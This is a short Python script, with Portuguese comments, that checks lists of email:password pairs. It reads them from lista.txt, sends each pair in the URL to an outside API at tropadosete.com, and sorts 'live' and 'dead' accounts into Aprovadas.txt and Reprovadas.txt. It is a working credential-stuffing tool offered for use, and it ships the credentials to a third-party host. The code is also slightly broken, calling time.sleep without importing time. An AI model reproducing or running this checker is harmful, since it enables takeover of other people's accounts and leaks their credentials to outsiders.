import requests
import sys 
import os

print( """                                                               
Manual:
Cole sua lista dentro de lista.txt
Vejas as lives dentro de Aprovadas.txt
Vejas as die dentro de Reprovadas.txt
""")

try:
	db = sys.argv[1]
	dl = sys.argv[2]
except Exception:
    #Caso queria mudar a db e o delimitador
	db = "lista.txt"
	dl = ":"

f = open(db,'r').readlines()

for i in range(len(f)):
	
    email = f[i].split()[0].split(dl)[0]
    senha = f[i].split()[0].split(dl)[1]
    
    url = "https://tropadosete.com/v3/api.php?lista="+email+":"+senha    
    r = requests.get(url).text
    #print(r)
    if ("#Aprovada "+email+":"+senha) in r:
    	print("[¥]Live:"+email+dl+senha)
    	print(r)
    	o = open("Aprovadas.txt","a")
    	o.write(email+dl+senha+"\n")
    else:
    	print("[¥]Dead:"+email+dl+senha)
    	o = open('Reprovadas.txt',"a")
    	o.write(email+dl+senha+"\n")
time.sleep(5)
